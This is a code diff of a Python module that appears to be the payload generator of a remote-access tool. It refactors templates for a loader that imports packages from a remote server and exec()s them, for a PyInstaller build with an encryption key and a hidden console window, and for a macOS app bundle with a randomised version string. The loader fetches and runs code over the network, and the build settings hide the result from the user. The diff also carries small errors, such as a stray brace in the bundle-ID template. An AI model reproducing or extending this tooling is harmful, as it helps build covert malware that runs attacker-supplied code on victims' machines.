@@ -7,6 +7,7 @@ import os
 import sys
 import zlib
 import base64
+import string
 import random
 import marshal
 import tempfile
@@ -15,16 +16,16 @@ import subprocess
 # modules
 import util
 
-# globals
-__Template_main  = """
+# templates
+template_main  = string.Template("""
 if __name__ == '__main__':
-    _{0} = {1}({2})
-    """
+    _${VARIABLE} = ${FUNCTION}(${OPTIONS})
+    """)
 
-__Template_load = """
+template_load = string.Template("""
 # remotely import dependencies from server
 
-packages = {0}
+packages = ${PACKAGES}
 
 for package in packages:
     try:
@@ -32,39 +33,39 @@ for package in packages:
         packages.remove(package)
     except: pass
 
-with remote_repo(packages, base_url={1}):
+with remote_repo(packages, base_url=${BASE_URL}):
     for package in packages:
         try:
             exec("import %s" % package, globals())
         except: pass
-"""
+""")
 
-__Template_plist = """<?xml version="1.0" encoding="UTF-8"?>
+template_plist = string.Template("""<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
 <dict>
 <key>CFBundleDevelopmentRegion</key>
 <string>English</string>
 <key>CFBundleExecutable</key>
-<string>{0}</string>
+<string>${BASE_NAME}</string>
 <key>CFBundleGetInfoString</key>
-<string>{1}</string>
+<string>${BUNDLE_VERSION}</string>
 <key>CFBundleIconFile</key>
-<string>{2}</string>
+<string>${ICON_PATH}</string>
 <key>CFBundleIdentifier</key>
-<string>{3}</string>
+<string>${BUNDLE_ID}}</string>
 <key>CFBundleInfoDictionaryVersion</key>
 <string>6.0</string>
 <key>CFBundleName</key>
-<string>{4}</string>
+<string>${BUNDLE_NAME}</string>
 <key>CFBundlePackageType</key>
 <string>APPL</string>
 <key>CFBundleShortVersionString</key>
-<string>{5}</string>
+<string>${BUNDLE_VERSION}</string>
 <key>CFBundleSignature</key>
 <string>????</string>
 <key>CFBundleVersion</key>
-<string>{6}</string>
+<string>${VERSION}</string>
 <key>NSAppleScriptEnabled</key>
 <string>YES</string>
 <key>NSMainNibFile</key>
@@ -73,15 +74,15 @@ __Template_plist = """<?xml version="1.0" encoding="UTF-8"?>
 <string>NSApplication</string>
 </dict>
 </plist>
-"""
+""")
 
-__Template_spec = """# -*- mode: python -*-
-block_cipher = pyi_crypto.PyiBlockCipher(key={key})
-a = Analysis([{basename}],
-             pathex=[{path}],
+template_spec = string.Template("""# -*- mode: python -*-
+block_cipher = pyi_crypto.PyiBlockCipher(key=${KEY})
+a = Analysis([${BASENAME}],
+             pathex=[${PATH}],
              binaries=[],
              datas=[],
-             hiddenimports={imports},
+             hiddenimports=${IMPORTS},
              hookspath=[],
              runtime_hooks=[],
              excludes=['site'],
@@ -95,13 +96,13 @@ exe = EXE(pyz,
           a.binaries,
           a.zipfiles,
           a.datas,
-          name={name},
+          name=${NAME},
           debug=False,
           strip=False,
           upx=False,
           runtime_tmpdir=None,
-          console=False, icon={icon})
-"""
+          console=False, icon=${ICON})
+""")
 
 # main
 def compress(input):
@@ -167,8 +168,9 @@ def main(function, *args, **kwargs):
     Returns code snippet as a string
 
     """
+    global template_main
     options = ', '.join(args) + str(', '.join(str("{}={}".format(k, v) if bool(v.count('{') > 0 and v.count('{') > 0) else "{}='{}'".format(k,v)) for k,v in kwargs.items()) if len(kwargs) else '')
-    return __Template_main.format(function.lower(), function, options)
+    return template_main.substitute(VARIABLE=function.lower(), FUNCTION=function, OPTIONS=options)
 
 def loader(host='127.0.0.1', port=1337, packages=[]):
     """
@@ -183,8 +185,9 @@ def loader(host='127.0.0.1', port=1337, packages=[]):
     :param list imports:    package/modules to remotely import
 
     """
+    global template_load
     base_url = 'http://{}:{}'.format(host, port)
-    return __Template_load.format(repr(packages), repr(base_url))
+    return template_load.substitute(PACKAGES=repr(packages), BASE_URL=repr(base_url))
 
 def freeze(filename, icon=None, hidden=None):
     """
@@ -198,6 +201,7 @@ def freeze(filename, icon=None, hidden=None):
     Returns output filename as a string
 
     """
+    global template_spec
     basename = os.path.basename(filename)
     name = os.path.splitext(basename)[0]
     path = os.path.splitdrive(os.path.abspath('.'))[1].replace('\\','/')
@@ -212,7 +216,7 @@ def freeze(filename, icon=None, hidden=None):
     imports = list(set(imports))
     if isinstance(hidden, list):
         imports.extend(hidden)
-    spec = __Template_spec.format(key=repr(key), basename=repr(basename), path=repr(path), imports=imports, name=repr(name), icon=repr(icon))
+    spec = template_spec.substitute(KEY=repr(key), BASENAME=repr(basename), PATH=repr(path), IMPORTS=imports, NAME=repr(name), ICON=repr(icon))
     fspec = os.path.join(path, name + '.spec')
     with open(fspec, 'w') as fp:
         fp.write(spec)
@@ -236,6 +240,7 @@ def app(filename, icon=None):
 
     Returns output filename as a string
     """
+    global template_plist
     version = '%d.%d.%d' % (random.randint(0,3), random.randint(0,6), random.randint(1, 9))
     baseName = os.path.basename(filename)
     bundleName = os.path.splitext(baseName)[0]
@@ -249,7 +254,7 @@ def app(filename, icon=None):
     executable = os.path.join(distPath, filename)
     bundleVersion = bundleName + ' ' + version
     bundleIdentity = 'com.' + bundleName
-    infoPlist = __Template_plist.format(baseName, bundleVersion, iconPath, bundleIdentity, bundleName, bundleVersion, version)
+    infoPlist = template_plist.substitute(BASE_NAME=baseName, BUNDLE_VERSION=bundleVersion, ICON_PATH=iconPath, BUNDLE_ID=bundleIdentity, BUNDLE_NAME=bundleName, VERSION=version)
     os.makedirs(distPath)
     os.mkdir(rsrcPath)
     with open(pkgPath, "w") as fp:
